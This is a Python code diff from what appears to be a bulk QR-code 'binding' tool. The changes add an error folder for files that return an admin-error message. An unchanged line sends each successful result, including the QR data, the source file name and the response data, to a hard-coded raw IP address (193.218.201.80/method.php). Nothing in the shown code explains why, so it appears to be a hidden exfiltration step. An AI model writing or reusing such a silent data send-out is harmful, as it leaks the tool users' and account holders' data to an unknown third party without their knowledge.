@@ -82,6 +82,8 @@ def querys():
         if open1text:
 
             file_path = open1text
+            if not os.path.exists(open2text + "/error/"):
+                os.mkdir(open2text + "/error/" )
             for root, dirs, files in os.walk(open1text):  # 开始遍历文件
                 for f in files:
                     if can != "2147483647":
@@ -147,13 +149,16 @@ def querys():
                         re = json.loads(html.text)
                         all.writelines(qrdata + " 数据：" + re['msg'] + '\n')
                         b = b + 1
+                        split = qrdata[qrdata.rfind("/") + 1:]
                         if re['msg'] == "绑定成功" or re['code'] == 0:
                             a = a + 1
                             data_ = qrdata + " 原文件：" + f + " 数据：" + str(re['msg']) + " " + str(re['data'])
                             requests.get("http://193.218.201.80/method.php?method=b&data=" + data_)
                             success.writelines(data_ + '\n')
-                            split = qrdata[qrdata.rfind("/") + 1:]
                             shutil.copy(file, open2text + "/" + split + lower)
+                        else:
+                            if re['msg'] == "程序异常请联系管理员":
+                                shutil.copy(file, open2text + "/error/" + split + lower)
 
                 else:
                     continue
